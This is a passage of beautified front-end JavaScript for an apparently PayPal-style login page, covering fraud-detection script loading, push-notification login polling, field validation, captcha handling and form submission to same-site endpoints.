                            typeof Object.assign != "function" &&
                                (Object.assign = function (e, t) {
                                    if (e === null) throw new TypeError("Cannot convert undefined or null to object");
                                    var n = Object(e);
                                    for (var r = 1; r < arguments.length; r++) {
                                        var i = arguments[r];
                                        if (i !== null) for (var s in i) Object.prototype.hasOwnProperty.call(i, s) && (n[s] = i[s]);
                                    }
                                    return n;
                                }),
                                String.prototype.trim ||
                                    (String.prototype.trim = function () {
                                        return this.replace(/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g, "");
                                    });
                        })(),
                        (login.fn = (function () {
                            function t(t) {
                                var n = document.getElementById("fconfig");
                                n && n.parentNode && n.parentNode.removeChild(n),
                                    (n = document.createElement("script")),
                                    (n.id = "fconfig"),
                                    (n.type = "application/json"),
                                    n.setAttribute("fncls", e),
                                    n.setAttribute("nonce", $("body").data("nonce")),
                                    (n.text = '{"f":"' + t.fnSessionId + '","s":"' + t.sourceId + '","b":"' + t.beaconUrl + '"}'),
                                    document.body.appendChild(n);
                            }
                            function n(e) {
                                var t = document.createElement("script");
                                (t.src = e.fnUrl),
                                    (t.onload = function () {
                                        r(e);
                                    }),
                                    document.body.appendChild(t);
                            }
                            function r(e) {
                                e.enableSpeedTyping && typeof initTsFb == "function" && initTsFb({ detail: { type: "UL", fields: ["email", "password"] } });
                            }
                            function i(e) {
                                PAYPAL.syncData && typeof PAYPAL.syncData.initSync == "function" && e && ((e.detail = { type: "UL", fields: ["email", "password"] }), PAYPAL.syncData.initSync(e));
                            }
                            function s() {
                                if (PAYPAL.syncData && typeof PAYPAL.syncData.flushData == "function")
                                    try {
                                        PAYPAL.syncData.flushData();
                                    } catch (e) {}
                            }
                            function o(e) {
                                e && e.sourceId && typeof PAYPAL.ulSync == "object" && ((PAYPAL.ulSync.sourceId = e.sourceId), i(PAYPAL.ulSync));
                            }
                            function u() {
                                var e = $("body").data("enableFnBeaconOnWebViews");
                                return !e && /(iPhone|iPod|iPad).*AppleWebKit(?!.*Safari)/i.test(window.navigator.userAgent) ? !1 : !0;
                            }
                            function a() {
                                u() && PAYPAL && PAYPAL.ulData && (t(PAYPAL.ulData), n(PAYPAL.ulData)), i(PAYPAL.ulSync);
                            }
                            var e = "fnparams-dede7cc5-15fd-4c75-a9f4-36c430ee3a99";
                            return { initialize: a, initializeFnSync: i, addFnSyncData: s, updateFnSyncContext: o };
                        })()),
                        (login.verification = (function () {
                            function S(e) {
                                login.utils.updateView({ splitLoginContext: "inputPassword", profile: { email: h }, verification: null, notifications: e.notifications });
                            }
                            function x() {
                                if (PAYPAL.syncData && typeof PAYPAL.syncData.data == "object") return JSON.stringify(PAYPAL.syncData.data);
                            }
                            function T(e) {
                                var t = (PAYPAL.ulSync && PAYPAL.ulSync.sourceId) || "",
                                    n = t.indexOf("REMEMBERED") !== -1 ? "_REMEMBERED" : "",
                                    r = { inputPassword: "UNIFIED_LOGIN_INPUT_PASSWORD" };
                                return { sourceId: r[e] + n };
                            }
                            function N() {
                                var e = login.storeInstance.getState().model.rememberProfile,
                                    t = { _csrf: o.value, intent: "completeLogin", accessToken: l, "locale.x": u.value, rememberProfile: e === "true" || e === !0, login_email: h, flowId: login.utils.getFlowId() },
                                    n = x();
                                n && (t.fn_sync_data = n),
                                    $.ajax({
                                        url: "/signin/challenge/push",
                                        type: "POST",
                                        data: t,
                                        success: function (e) {
                                            if (e && e.pollStatus === "LoggedIn" && e.returnUrl) return (window.location.href = e.returnUrl);
                                            if (e && e.pollStatus === "Failed") return S(e);
                                            $(p).addClass("hide"), $(d).removeClass("hide");
                                        },
                                    });
                            }
                            function C() {
                                if (!f) return;
                                if (t >= e) {
                                    $(p).addClass("hide"), $(d).removeClass("hide"), login.tpdLogin.instrumentTpdExpired();
                                    return;
                                }
                                t++,
                                    (a = $.ajax({
                                        url: "/signin/challenge/push",
                                        type: "POST",
                                        data: { _csrf: o.value, intent: "poll", accessToken: l, authflowDocumentId: c, retryCount: t, "locale.x": u.value, flowId: login.utils.getFlowId() },
                                        success: E,
                                        fail: function () {
                                            f && C();
                                        },
                                    }));
                            }
                            function k(e) {
                                (e = e || {}), (f = !0), (l = e.accessToken || l), (c = e.authflowDocumentId || c), (h = e.email || h), C();
                            }
                            function L() {
                                window.location.href = window.location.href;
                            }
                            function A() {
                                (f = !1), a.abort();
                            }
                            function O() {
                                setTimeout(function () {
                                    $(b).removeClass("hide");
                                }, n);
                            }
                            function M(e) {
                                e.preventDefault();
                                if ($(e.target).hasClass("greyOut")) return;
                                login.tpdLogin.instrumentResendClicked(),
                                    A(),
                                    (t = 0),
                                    $(b).addClass("greyOut"),
                                    s++,
                                    $.ajax({
                                        url: "/signin/challenge/push",
                                        type: "POST",
                                        data: { _csrf: o.value, intent: "resend", accessToken: l, authflowDocumentId: c, "locale.x": u.value, flowId: login.utils.getFlowId() },
                                        success: function (t) {
                                            if (t && t.resendStatus === "Success") {
                                                k({ accessToken: l, authflowDocumentId: c, email: h }),
                                                    $(b).addClass("hide"),
                                                    $(w).removeClass("hide"),
                                                    setTimeout(function () {
                                                        $(w).addClass("hide"), s < i && ($(b).removeClass("hide"), $(b).removeClass("greyOut"));
                                                    }, r);
                                                return;
                                            }
                                            t && t.notifications && login.view.updateNotificationView(t);
                                        },
                                        fail: function () {},
                                    });
                            }
                            var e = 5,
                                t = 0,
                                n = 5e3,
                                r = 3e3,
                                i = 3,
                                s = 0,
                                o = document.querySelector("input[name=_csrf]"),
                                u = document.querySelector('input[name="locale.x"]'),
                                a,
                                f = !1,
                                l,
                                c,
                                h,
                                p = document.querySelector(".verificationSubSection"),
                                d = document.querySelector("#expired"),
                                v = document.querySelector("#denied"),
                                m = document.querySelector("#expiredTryAgainButton"),
                                g = document.querySelector("#pendingNotYouLink"),
                                y = document.querySelector("#tryPasswordLink"),
                                b = document.querySelector("#resend"),
                                w = document.querySelector(".sentMessage"),
                                E = function (e) {
                                    e || C(), (o.value = e._csrf || o.value);
                                    switch (e.pollStatus) {
                                        case "Accepted":
                                            A(), N();
                                            break;
                                        case "Downgraded":
                                            C();
                                            break;
                                        case "Denied":
                                            A(), $(p).addClass("hide"), $(v).removeClass("hide");
                                            break;
                                        case "Failed":
                                            A(), S(e);
                                            break;
                                        default:
                                            e.errorView ? ($(p).addClass("hide"), $(d).removeClass("hide")) : C();
                                    }
                                };
                            return (
                                m && (login.logger.log({ evt: "TPD_CLIENT", data: "EXPIRED_TRY_AGAIN", calEvent: !0 }), login.logger.pushLogs(), (m.onclick = L)),
                                g &&
                                    (g.onclick = function (e) {
                                        A(), login.tpdLogin.instrumentNotYouClicked(), login.utils.notYouClickHandler(e);
                                    }),
                                y &&
                                    (y.onclick = function (e) {
                                        e.preventDefault(), A();
                                        var t = document.querySelector(".account");
                                        login.tpdLogin.instrumentUsePasswordInstead(), login.utils.updateView({ splitLoginContext: "inputPassword", profile: { email: h }, moreOptions: !0, verification: null, ulSync: T("inputPassword") });
                                    }),
                                addEvent(b, "click", M),
                                { startPolling: k, showResendLink: O }
                            );
                        })()),
                        (login.core = (function () {
                            return function () {
                                function P(e) {
                                    var t = getEventTarget(e);
                                    if (!_ || !e || !t) return;
                                    if ($(t).hasClass("moreOptionsInfo")) {
                                        eventPreventDefault(e),
                                            $(_).hasClass("hide") &&
                                                (login.logger.log({ evt: "state_name", data: "begin_pwd", instrument: !0 }),
                                                login.logger.log({ evt: "transition_name", data: "process_pwd_more_opt", instrument: !0 }),
                                                login.logger.log({ evt: "TPD_CLIENT", data: "CLICKED_MORE_OPTIONS", calEvent: !0 }),
                                                login.logger.pushLogs()),
                                            $(_).removeClass("hide");
                                        return;
                                    }
                                    $(_).addClass("hide");
                                }
                                function H(e) {
                                    login.utils.doesItLookLikeEmail(e)
                                        ? ((i.field.value = e), Y !== "email" && ((Y = "email"), l.setAttribute("value", "inputEmail"), $(x).addClass("hide"), $(f.container).removeClass("phoneInputWrapper"), (u.field.value = null)))
                                        : ((u.field.value = e), Y !== "phone" && ((Y = "phone"), l.setAttribute("value", "inputPhone"), $(x).removeClass("hide"), $(f.container).addClass("phoneInputWrapper"), (i.field.value = null)));
                                }
                                function B() {
                                    (u.field.value = null), (i.field.value = null), (f.field.value = null);
                                }
                                function Z(e) {
                                    if (!e || typeof e != "string") return;
                                    return e.replace(R, "");
                                }
                                function et(e) {
                                    return e.field ? (Z(e.field.value) ? !0 : (ot(e), ut(e), !1)) : !0;
                                }
                                function tt(e) {
                                    var t = e && e.field && e.field.value;
                                    return !e || !e.field || e.field.hasAttribute("disabled") ? !0 : t ? ((t = t && t.replace(X, "")), !t || t.match(z) ? (ot(e), at(e), lt(e), !1) : !0) : (ot(e), ut(e), ct(e), !1);
                                }
                                function nt(e) {
                                    var t = e && e.field && Z(e.field.value);
                                    return e && e.field && e.field.hasAttribute("disabled") ? !0 : t ? (t && t.match(W) ? (ot(e), at(e), !1) : !0) : (ot(e), ut(e), !1);
                                }
                                function rt(e, t) {
                                    var n,
                                        r,
                                        i = !0,
                                        s = login.utils.getActiveCaptchaElement(l);
                                    return (n = et(e)), n ? ((r = et(t)), r ? (s && s.field && (i = et(s)), i ? !0 : !1) : !1) : !1;
                                }
                                function it(e) {
                                    if (e.value === "inputEmail") return document.querySelector("#rememberProfileEmail");
                                    if (e.value === "inputPassword") return document.querySelector("#rememberProfilePassword");
                                    return;
                                }
                                function st(e) {
                                    var t = e.field.value.replace(R, "");
                                    return !t.match(U) && !e.field.hasAttribute("disabled") ? (ot(e), at(e), !1) : !0;
                                }
                                function ot(e) {
                                    $(e.container).addClass("hasError"), (e.container.style["z-index"] = 100), $(e.errMsgContainer).addClass("show"), e.field.focus();
                                }
                                function ut(e) {
                                    $(e.errMsg).removeClass("hide");
                                }
                                function at(e) {
                                    $(e.invalidMsg).removeClass("hide");
                                }
                                function ft(e, t) {
                                    t && $(e.container).removeClass("hasError"), (e.container.style["z-index"] = 1), $(e.errMsgContainer).removeClass("show");
                                }
                                function lt(e) {
                                    $(e.errMsg).addClass("hide");
                                }
                                function ct(e) {
                                    $(e.invalidMsg).addClass("hide");
                                }
                                function ht() {
                                    var e,
                                        t = /\&passwordRecoveryByPhoneEnabled\=true/;
                                    if (A) for (var n = 0; n < A.length; n++) (e = A[n].getAttribute("href").replace(t, "")), A[n].setAttribute("href", e);
                                    O && O.setAttribute("data-src", O.getAttribute("data-src").replace(t, ""));
                                }
                                function pt() {
                                    var e;
                                    if (A) for (var t = 0; t < A.length; t++) (e = A[t].getAttribute("href") + "&passwordRecoveryByPhoneEnabled=true"), A[t].setAttribute("href", e);
                                    O && O.setAttribute("data-src", O.getAttribute("data-src") + "&passwordRecoveryByPhoneEnabled=true");
                                }
                                function dt() {
                                    var e = document.querySelector('input[name="splitLoginContext"]'),
                                        t = document.querySelector('input[name="splitLoginCookiedFallback"]');
                                    $(d).removeClass("hide"),
                                        $(v).addClass("hide"),
                                        N && $(N).addClass("hide"),
                                        i.field && i.field.removeAttribute("disabled"),
                                        s.field && s.field.removeAttribute("disabled"),
                                        o.field && o.field.setAttribute("disabled", "disabled"),
                                        u.field && u.field.setAttribute("disabled", "disabled"),
                                        a.field && a.field.setAttribute("disabled", "disabled"),
                                        Q || $(L).removeClass("hide"),
                                        E && $(E).addClass("hide"),
                                        $(p).removeClass("phonePresent"),
                                        (Y = "email"),
                                        e && (C && $(C).removeClass("hide"), (e.value = "inputEmail"), t && (e.value = "inputPassword"));
                                }
                                function vt() {
                                    var e = document.querySelector('input[name="splitLoginContext"]');
                                    $(v).removeClass("hide"),
                                        $(d).addClass("hide"),
                                        N && !$(m).hasClass("hide") && $(N).removeClass("hide"),
                                        o.field && o.field.removeAttribute("disabled"),
                                        u.field && u.field.removeAttribute("disabled"),
                                        a.field && a.field.removeAttribute("disabled"),
                                        i.field && i.field.setAttribute("disabled", "disabled"),
                                        s.field && s.field.setAttribute("disabled", "disabled"),
                                        $(L).addClass("hide"),
                                        $(p).addClass("phonePresent"),
                                        b && $(b).addClass("hide"),
                                        (Y = "phone"),
                                        C && $(C).addClass("hide"),
                                        e && !Q && (e.value = e.value === "inputPassword" ? "inputPin" : "inputPhone");
                                }
                                function mt() {
                                    function i() {
                                        var e = n.options[n.selectedIndex].value,
                                            t = e.split(" ");
                                        return { countryCode: t && (t[0] || ""), phoneCode: t && (t[1] || "") };
                                    }
                                    var e = o.container.querySelector(".countryCode"),
                                        t = o.container.querySelector(".phoneCode"),
                                        n = o.field,
                                        r;
                                    (r = i()), $(e).text(r.countryCode), $(t).text(r.phoneCode);
                                }
                                function gt(e) {
                                    eventPreventDefault(e);
                                    var t = document.querySelector('input[name="splitLoginContext"]');
                                    $(v).removeClass("hide"),
                                        $(d).addClass("hide"),
                                        $(b).addClass("hide"),
                                        $(E).removeClass("hide"),
                                        ft(i, !0),
                                        o.field && o.field.removeAttribute("disabled"),
                                        u.field && u.field.removeAttribute("disabled"),
                                        u.field.focus(),
                                        C && $(C).addClass("hide"),
                                        k && $(k).removeClass("hide"),
                                        i.field && (i.field.value = ""),
                                        login.view.updateNotificationView({}),
                                        i.field && i.field.setAttribute("disabled", "disabled"),
                                        (t.value = "inputPhone"),
                                        login.logger.log({ evt: "state_name", data: "begin_email", instrument: !0 }),
                                        login.logger.log({ evt: "transition_name", data: "prepare_phone", instrument: !0 }),
                                        login.logger.pushLogs(),
                                        login.logger.log({ evt: "state_name", data: "begin_phone", instrument: !0 }),
                                        login.logger.log({ evt: "transition_name", data: "prepare_phone", instrument: !0 }),
                                        login.logger.pushLogs(),
                                        G
                                            ? (a.field && a.field.removeAttribute("disabled"), s.field && s.field.setAttribute("disabled", "disabled"), (Y = "phone"), $(p).addClass("phonePresent"), $(L).addClass("hide"))
                                            : (s.field && s.field.removeAttribute("disabled"), a.field && a.field.setAttribute("disabled", "disabled"), (Y = "phonePassword"));
                                }
                                function yt(e) {
                                    eventPreventDefault(e);
                                    var t = document.querySelector('input[name="splitLoginContext"]');
                                    $(d).removeClass("hide"),
                                        $(v).addClass("hide"),
                                        $(E).addClass("hide"),
                                        $(b).removeClass("hide"),
                                        N && $(N).addClass("hide"),
                                        ft(u, !0),
                                        i.field && i.field.removeAttribute("disabled"),
                                        s.field && s.field.removeAttribute("disabled"),
                                        i.field.focus(),
                                        o.field && o.field.setAttribute("disabled", "disabled"),
                                        u.field && u.field.setAttribute("disabled", "disabled"),
                                        a.field && a.field.setAttribute("disabled", "disabled"),
                                        k && $(k).addClass("hide"),
                                        C && $(C).removeClass("hide"),
                                        $(p).removeClass("phonePresent"),
                                        (Y = "email"),
                                        (t.value = "inputEmail"),
                                        login.logger.log({ evt: "state_name", data: "begin_phone", instrument: !0 }),
                                        login.logger.log({ evt: "transition_name", data: "prepare_email", instrument: !0 }),
                                        login.logger.pushLogs(),
                                        login.logger.log({ evt: "state_name", data: "begin_email", instrument: !0 }),
                                        login.logger.log({ evt: "transition_name", data: "prepare_email", instrument: !0 }),
                                        login.logger.pushLogs();
                                }
                                function bt(e, t) {
                                    eventPreventDefault(e),
                                        ht(),
                                        (Y = "email"),
                                        login.utils.notYouClickHandler(e, function () {
                                            login.logger.log({ evt: "state_name", data: "begin_phone_pwd", instrument: !0 }),
                                                login.logger.log({ evt: "transition_name", data: "prepare_email", instrument: !0 }),
                                                login.logger.pushLogs(),
                                                login.logger.log({ evt: "state_name", data: "begin_email", instrument: !0 }),
                                                login.logger.log({ evt: "transition_name", data: "prepare_email", instrument: !0 }),
                                                login.logger.pushLogs(),
                                                typeof t == "function" && t();
                                        });
                                }
                                function wt(e) {
                                    var t = document.querySelector("input[name=splitLoginContext]"),
                                        n = document.querySelector("input[name=splitLoginCookiedFallback]"),
                                        r = (t && t.value) || "";
                                    n ? St(e) : r === "inputEmail" || r === "inputPhone" ? Et(e) : St(e);
                                }
                                function Et(e) {
                                    var r;
                                    D ? (r = Y === "email" ? nt(f) : tt(f)) : (r = Y === "email" ? nt(i) : tt(u));
                                    var s = document.querySelectorAll("form[name=login] input"),
                                        o = {},
                                        a = login.utils.getActiveCaptchaElement(l),
                                        c = it(l),
                                        h = $("body").data("splitPasswordClientTransition"),
                                        p,
                                        d,
                                        v,
                                        m,
                                        g,
                                        y = window.PAYPAL && window.PAYPAL.analytics,
                                        b = document.querySelector("#phoneCode"),
                                        w = login.utils.getSplitLoginContext();
                                    (V = !0),
                                        eventPreventDefault(e),
                                        r && $(i.field).hasClass("validate") && (r = st(i)),
                                        r && a && a.field && (r = et(a)),
                                        r &&
                                            (w === "inputEmail" || w === "inputPhone") &&
                                            (login.logger.log({ evt: "state_name", data: login.logger.getStateName(), instrument: !0 }),
                                            login.logger.log({ evt: "transition_name", data: "process_next", instrument: !0 }),
                                            login.logger.pushLogs());
                                    if (!r) return;
                                    login.utils.showSpinner(), login.fn.addFnSyncData(), (Y === "phonePassword" || Y === "phone") && pt(), t && $(t).text(""), y && y.startCPLTracking && y.startCPLTracking();
                                    if (!(!h || (Y !== "phone" && Y !== "phonePassword"))) {
                                        (p = document.querySelector("#phone")),
                                            (d = p && p.value.replace(X, "")),
                                            (v = document.querySelector("#phoneCode")),
                                            (v = v && v.value.replace(/[A-Z\s]/gi, "")),
                                            (p.value = d),
                                            login.storeInstance.updateModel({ splitLoginContext: G ? "inputPin" : "inputPassword", profile: { phone: d, phoneCode: v } }),
                                            login.logger.log({ evt: "state_name", data: "begin_phone", instrument: !0 }),
                                            login.logger.log({ evt: "transition_name", data: G ? "prepare_pin" : "prepare_pwd", instrument: !0 }),
                                            login.logger.pushLogs(),
                                            login.utils.hideSpinner(),
                                            login.utils.setSliderToPasswordContainer();
                                        return;
                                    }
                                    if (h && Y === "email") {
                                        login.storeInstance.updateModel({ splitLoginContext: "inputPassword", profile: { email: i && i.field && i.field.value }, rememberProfile: c && c.checked }),
                                            login.utils.hideSpinner(),
                                            y && y.endCPLTracking && ((m = { pgrp: "main:unifiedlogin:splitlogin::pwd", page: "main:unifiedlogin:splitlogin::pwd:::" }), y.endCPLTracking({ pageData: m })),
                                            login.utils.setSliderToPasswordContainer();
                                        return;
                                    }
                                    for (var E = 0; E < s.length; E++) o[s[E].name] = s[E].value;
                                    delete o.login_password,
                                        delete o.login_pin,
                                        delete o.emailOrPhone,
                                        o.splitLoginContext === "inputPhone" && b && ((o.phoneCode = b.value), delete o.login_email),
                                        o.splitLoginContext === "inputEmail" && (delete o.login_phone, delete o.phoneCode),
                                        D && o.splitLoginContext === "inputPassword" && o.login_phone && (o.phoneCode = b.value),
                                        a && a.field && (o.captcha = a.field.value),
                                        c && (o.rememberProfile = c.checked),
                                        (g = getEventTarget(e)),
                                        D &&
                                            (o.emailOrPhone &&
                                                (o.splitLoginContext === "inputPhone"
                                                    ? ((o.login_phone = o.emailOrPhone), (u.field.value = o.emailOrPhone))
                                                    : o.splitLoginContext === "inputEmail" && ((o.login_email = o.emailOrPhone), (i.field.value = o.emailOrPhone))),
                                            o.splitLoginContext === "inputPassword" && o.login_phone && (o.phoneCode = b.value)),
                                        $.ajax({ url: n.getAttribute("action"), data: o, success: login.utils.successfulXhrHandler, fail: login.utils.failedXhrSubmitHandler });
                                }
                                function St(e) {
                                    function o() {
                                        var e = l && l.value;
                                        if (!u.field) return;
                                        e === "inputPassword" ? (t = s.field && rt(u, s)) : (t = a.field && rt(u, a));
                                    }
                                    var t,
                                        r = document.querySelector(".profileRememberedEmail");
                                    (V = !0),
                                        Y === "email" ? ((t = nt(i) && rt(i, s)), !r && t && $(i.field).hasClass("validate") && (t = st(i))) : o(),
                                        t
                                            ? (login.utils.showSpinner(),
                                              login.utils.showSpinnerMessage(),
                                              login.fn.addFnSyncData(),
                                              eventPreventDefault(e),
                                              n && n.submit(),
                                              setTimeout(function () {
                                                  h.setAttribute("disabled", "disabled");
                                              }, 10))
                                            : eventPreventDefault(e);
                                }
                                function xt(e) {
                                    var t;
                                    if (!V) return !1;
                                    t = e.field.value.replace(R, "");
                                    if (t === "") {
                                        ut(e), e.type === "email" && ct(e);
                                        return;
                                    }
                                    lt(e), e.type === "email" && $(e.field).hasClass("validate") ? (t.match(U) ? (ct(e), ft(e, !0)) : (ot(e), at(e))) : ft(e, !0);
                                }
                                function Tt(e) {
                                    (V = !1), ft(e);
                                }
                                function Nt(e) {
                                    $(e.container).hasClass("hasError") ? (V = !0) : (V = !1);
                                }
                                function Ct() {
                                    var e = u.field && u.field.value;
                                    return u.field && ((i.field && i.field.hasAttribute("disabled")) || (l && l.value === "inputPhone")) ? (G ? "phone" : "phonePassword") : (l && l.value === "inputPin") || e ? "phone" : "email";
                                }
                                function kt(e) {
                                    var t = login.utils.getActiveCaptchaElement(l),
                                        n = t.audioTag,
                                        r = !!n.canPlayType && !!n.canPlayType("audio/mpeg").replace(/no/, "");
                                    if (!r) return !0;
                                    eventPreventDefault(e), t.field.focus(), n.play();
                                }
                                function Lt(e) {
                                    var t = login.utils.getActiveCaptchaElement(l);
                                    eventPreventDefault(e),
                                        eventStopPropagation(e),
                                        $.ajax({
                                            type: "POST",
                                            url: "/signin/refreshCaptcha",
                                            data: { _csrf: document.querySelector("#token").value },
                                            dataType: "json",
                                            success: function (e) {
                                                e &&
                                                    e.captcha &&
                                                    (t.image.setAttribute("src", e.captcha.captchaImgUrl),
                                                    t.audioTag.setAttribute("src", e.captcha.captchaAudioUrl),
                                                    t.playAudioBtn.setAttribute("href", e.captcha.captchaAudioUrl),
                                                    (t.field.value = ""),
                                                    $("body").hasClass("desktop") && t.field.focus());
                                            },
                                        });
                                }
                                function At(e) {
                                    var t = getEventTarget(e);
                                    if (!t) return;
                                    setTimeout(function () {
                                        $(t).hasClass("scTrack:unifiedlogin-rememberme-profile-opt-in")
                                            ? ($(t).removeClass("scTrack:unifiedlogin-rememberme-profile-opt-in"), $(t).addClass("scTrack:unifiedlogin-rememberme-profile-opt-out"))
                                            : ($(t).removeClass("scTrack:unifiedlogin-rememberme-profile-opt-out"), $(t).addClass("scTrack:unifiedlogin-rememberme-profile-opt-in"));
                                    }, 10);
                                }
                                function Ot() {
                                    function n(e) {
                                        (e.playAudioBtn.onclick = kt), (e.refreshCaptchaBtn.onclick = Lt), (e.field.onkeyup = xt.bind(null, e)), (e.field.onblur = Tt.bind(null, e)), (e.field.onfocus = Nt.bind(null, e));
                                    }
                                    var e = document.querySelectorAll(".captcha-container");
                                    for (var t = 0; t < e.length; t++) n(login.utils.getCaptchaDom(e[t]));
                                }
                                function Mt(e) {
                                    var t = getEventTarget(e),
                                        r,
                                        i,
                                        s;
                                    if (!t || t.id !== "iconCloseEducation") return;
                                    r = document.querySelector(".educationMessage");
                                    if (!r) return;
                                    (i = document.querySelector(".contentContainer")),
                                        $(r).addClass("hide"),
                                        i && $(i).removeClass("contentContainerShort"),
                                        (s = document.createElement("input")),
                                        s.setAttribute("type", "hidden"),
                                        s.setAttribute("name", "removeEducationMsg"),
                                        s.setAttribute("value", "true"),
                                        $(n).append(s);
                                }
                                function _t() {
                                    var e = document.querySelector("#splitLoginOptOut");
                                    e && addEvent(e, "click", login.utils.getOutboundLinksHandler(e, null, "process_split_login_opt_out"));
                                }
                                function Dt(e) {
                                    var t = Y === "email" ? nt(i) : tt(u);
                                    eventPreventDefault(e), login.tpdLogin && login.tpdLogin.instrumentTpdLoginClicked(), t && $(i.field).hasClass("validate") && (t = st(i));
                                    if (!t) return;
                                    login.tpdLogin && login.tpdLogin.attemptTpdLogin("tpd");
                                }
                                function Pt(e) {
                                    ht(), (Y = "email"), login.utils.notYouClickHandler(e), i.container && ft(i, !0), s.container && ft(s, !0), u.container && ft(u, !0), a.container && ft(a, !0);
                                }
                                var t = document.querySelector("#notifications"),
                                    n = document.querySelector("form[name=login]"),
                                    r = document.querySelector('input[name="splitLoginCookiedFallback"]'),
                                    i = {
                                        container: document.querySelector("#login_emaildiv"),
                                        field: document.querySelector("#email"),
                                        errMsgContainer: document.querySelector("#emailErrorMessage"),
                                        errMsg: document.querySelector("#emailErrorMessage .emptyError"),
                                        invalidMsg: document.querySelector("#emailErrorMessage .invalidError"),
                                        phoneEmailToggleIcon: document.querySelector("#login_emaildiv .icon"),
                                        type: "email",
                                    },
                                    s = {
                                        container: document.querySelector("#login_passworddiv"),
                                        field: document.querySelector("#password"),
                                        errMsgContainer: document.querySelector("#passwordErrorMessage"),
                                        errMsg: document.querySelector("#passwordErrorMessage .emptyError"),
                                    },
                                    o = { container: document.querySelector("#pinSection") || document.querySelector(".splitPhoneSection"), field: document.querySelector("#phoneCode") },
                                    u = {
                                        container: document.querySelector("#login_phonediv"),
                                        field: document.querySelector("#phone"),
                                        errMsgContainer: document.querySelector("#phoneErrorMessage"),
                                        errMsg: document.querySelector("#phoneErrorMessage .emptyError"),
                                        invalidMsg: document.querySelector("#phoneErrorMessage .invalidError"),
                                    },
                                    a = {
                                        container: document.querySelector("#login_pindiv"),
                                        field: document.querySelector("#pin"),
                                        errMsgContainer: document.querySelector("#pinErrorMessage"),
                                        errMsg: document.querySelector("#pinErrorMessage .emptyError"),
                                    },
                                    f = {
                                        container: document.querySelector("#emailOrPhonediv"),
                                        field: document.querySelector("#emailOrPhone"),
                                        errMsgContainer: document.querySelector("#emailOrPhoneErrorMessage"),
                                        errMsg: document.querySelector("#emailOrPhoneErrorMessage .emptyError"),
                                        invalidMsg: document.querySelector("#emailOrPhoneErrorMessage .invalidError"),
                                        type: "text",
                                    },
                                    l = document.querySelector("input[name=splitLoginContext]"),
                                    n = document.querySelector(".proceed"),
                                    c = document.querySelector("#btnNext"),
                                    h = document.querySelector("#btnLogin"),
                                    p = document.querySelector(".actions"),
                                    d = document.querySelector("#splitEmailSection") || document.querySelector("#passwordSection"),
                                    v = document.querySelector("#splitPhoneSection") || document.querySelector("#pinSection"),
                                    m = document.querySelector("#splitPassword") || document.querySelector("#splitPinSection") || document.querySelector("#pinSection"),
                                    g = document.querySelector(".email"),
                                    y = document.querySelector(".phone"),
                                    b = document.querySelector("#loginWithPhoneOption"),
                                    w = document.querySelector("#switchToPhone"),
                                    E = document.querySelector("#loginWithEmailOption"),
                                    S = document.querySelector("#switchToEmail"),
                                    x = document.querySelector(".countryPhoneSelectWrapper"),
                                    T = document.querySelector("#emailPageSwitch"),
                                    N = document.querySelector(".educationMessage"),
                                    C = document.querySelector("#emailSubTagLine"),
                                    k = document.querySelector("#phoneSubTagLine"),
                                    L = document.querySelector(".forgotLink"),
                                    A = L && L.querySelectorAll(".pwrLink"),
                                    O = L && L.querySelector("#pwdIframe"),
                                    M = document.querySelector("#moreOptionsMobile"),
                                    _ = document.querySelector("#moreOptionsDropDown"),
                                    D = $("body").data("isHybridLoginExperience") === "true";
                                D &&
                                    addEvent(f.field, "keyup", function (e) {
                                        var t = getEventTarget(e);
                                        if (!t) return;
                                        H(t.value);
                                    }),
                                    login.pubsub && login.pubsub.subscribe("WINDOW_CLICK", P);
                                var j = document.querySelector("#createAccount");
                                j &&
                                    (j.onclick = function (e) {
                                        var t = login.logger.getStateName();
                                        login.utils.getOutboundLinksHandler(j, t, "process_signup")(e);
                                    });
                                var F = document.querySelector("#backToInputEmailLink"),
                                    I = document.querySelector("#backToEmailPasswordLink"),
                                    q = document.querySelector("#rememberProfileEmail"),
                                    R = /^\s+|\s+$/,
                                    U = /^\S+@\S+\.\S+$/,
                                    z = /[^\d]+/g,
                                    W = /\s/g,
                                    X = /[-().\s]/gi,
                                    V = !1,
                                    J = document.querySelector("form[name=smartlockForm]"),
                                    K = document.querySelector("#secondaryLoginBtn"),
                                    Q = $("body").data("phonePasswordEnabled"),
                                    G = $("body").data("phonePinEnabled"),
                                    Y = Ct();
                                i.field && ((i.field.onkeyup = xt.bind(null, i)), (i.field.onblur = Tt.bind(null, i)), (i.field.onfocus = Nt.bind(null, i))),
                                    s.field && ((s.field.onkeyup = xt.bind(null, s)), (s.field.onblur = Tt.bind(null, s)), (s.field.onfocus = Nt.bind(null, s))),
                                    u.field && ((u.field.onkeyup = xt.bind(null, u)), (u.field.onblur = Tt.bind(null, u)), (u.field.onfocus = Nt.bind(null, u))),
                                    a.field && ((a.field.onkeyup = xt.bind(null, a)), (a.field.onblur = Tt.bind(null, a)), (a.field.onfocus = Nt.bind(null, a))),
                                    o && o.field && (o.field.onchange = mt),
                                    f.field && ((f.field.onkeyup = xt.bind(null, f)), (f.field.onblur = Tt.bind(null, f)), (f.field.onfocus = Nt.bind(null, f))),
                                    Ot(),
                                    _t(),
                                    g && y ? ((g.onclick = dt), (y.onclick = vt)) : g && (g.onclick = bt),
                                    Q && w && (w.onclick = gt),
                                    Q && S && (S.onclick = yt),
                                    addEvent(x, "focusin", function (e) {
                                        $(x).addClass("focus");
                                    }),
                                    addEvent(x, "focusout", function (e) {
                                        $(x).removeClass("focus");
                                    }),
                                    T &&
                                        addEvent(T, "click", function (e) {
                                            var t = document.querySelector("input[name=forcePhonePasswordOptIn]");
                                            eventPreventDefault(e),
                                                bt(e, function () {
                                                    t.value = "true";
                                                });
                                        }),
                                    addEvent(n, "keydown", function (e) {
                                        var t = getEventTarget(e);
                                        isEnterKeyPressed(e) && !t.href && wt(e);
                                    }),
                                    addEvent(n, "submit", wt),
                                    M && addEvent(M, "click", Dt),
                                    F &&
                                        addEvent(F, "click", function (e) {
                                            Pt(e), D && B();
                                        }),
                                    I &&
                                        addEvent(I, "click", function (e) {
                                            e.preventDefault(), r ? dt() : Pt(e);
                                        }),
                                    q && (q.onclick = At),
                                    login.pubsub && login.pubsub.subscribe("WINDOW_CLICK", Mt);
                            };
                        })()),
                        (login.oneTouchLogin = (function () {
                            function s() {
                                var n = [],
                                    s = document.querySelector('input[name="locale.x"]');
                                n.push({ evt: "state_name", data: "Login_UL_RM", instrument: !0 }),
                                    n.push({ evt: "transition_name", data: "prepare_login_UL_RM", instrument: !0 }),
